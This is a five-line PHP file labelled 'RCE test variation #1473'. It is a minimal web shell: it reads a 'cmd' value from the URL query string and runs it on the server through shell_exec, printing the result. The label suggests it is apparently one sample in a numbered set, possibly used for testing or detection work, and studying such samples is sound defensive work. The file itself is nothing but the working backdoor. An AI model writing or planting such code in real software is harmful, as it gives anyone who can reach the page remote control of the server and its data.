<?php
// RCE test variation #1473
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>